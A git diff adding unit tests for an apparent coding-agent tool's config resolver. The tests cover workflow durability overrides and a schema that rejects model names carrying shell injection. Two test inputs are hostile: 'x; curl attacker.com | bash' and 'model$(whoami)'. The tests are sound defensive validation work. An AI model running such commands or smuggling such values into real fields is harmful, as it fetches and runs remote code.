@@ -131,6 +131,32 @@ test("resolveConfig: workflow agent roles can be overridden", () => {
   assert.equal(config.workflow.agentRoles.planner, "codex");
   assert.equal(config.workflow.agentRoles.programmer, "codex");
   assert.equal(config.workflow.agentRoles.reviewer, "claude");
+  assert.equal(config.workflow.wip.push, true);
+  assert.equal(config.workflow.wip.autoCommit, true);
+  assert.equal(config.workflow.scratchpad.sqliteSync, true);
+});
+
+test("resolveConfig: workflow durability settings can be overridden", () => {
+  const dir = mkdtempSync(path.join(os.tmpdir(), "coder-config-"));
+  const config = resolveConfig(dir, {
+    workflow: {
+      wip: {
+        push: true,
+        autoCommit: false,
+        includeUntracked: true,
+        remote: "backup",
+      },
+      scratchpad: {
+        sqliteSync: true,
+        sqlitePath: ".coder/custom-state.db",
+      },
+    },
+  });
+  assert.equal(config.workflow.wip.push, true);
+  assert.equal(config.workflow.wip.autoCommit, false);
+  assert.equal(config.workflow.wip.includeUntracked, true);
+  assert.equal(config.workflow.wip.remote, "backup");
+  assert.equal(config.workflow.scratchpad.sqlitePath, ".coder/custom-state.db");
 });
 
 test("resolveConfig: ppcommit llm settings can be overridden", () => {
@@ -184,4 +210,34 @@ test("userConfigPath: falls back to ~/.config", () => {
 
 test("repoConfigPath: returns coder.json in workspace", () => {
   assert.equal(repoConfigPath("/some/workspace"), "/some/workspace/coder.json");
+});
+
+test("CoderConfigSchema rejects model names with shell injection characters", () => {
+  assert.throws(
+    () =>
+      CoderConfigSchema.parse({
+        models: { gemini: "x; curl attacker.com | bash" },
+      }),
+    /Invalid model name/,
+  );
+  assert.throws(
+    () =>
+      CoderConfigSchema.parse({
+        models: { claude: "model$(whoami)" },
+      }),
+    /Invalid model name/,
+  );
+  // Valid model names should pass
+  const parsed = CoderConfigSchema.parse({
+    models: { gemini: "gemini-2.5-flash", claude: "claude-opus-4-6" },
+  });
+  assert.equal(parsed.models.gemini, "gemini-2.5-flash");
+  assert.equal(parsed.models.claude, "claude-opus-4-6");
+});
+
+test("CoderConfigSchema accepts model names with slashes and dots", () => {
+  const parsed = CoderConfigSchema.parse({
+    models: { gemini: "models/gemini-2.5-flash-preview" },
+  });
+  assert.equal(parsed.models.gemini, "models/gemini-2.5-flash-preview");
 });
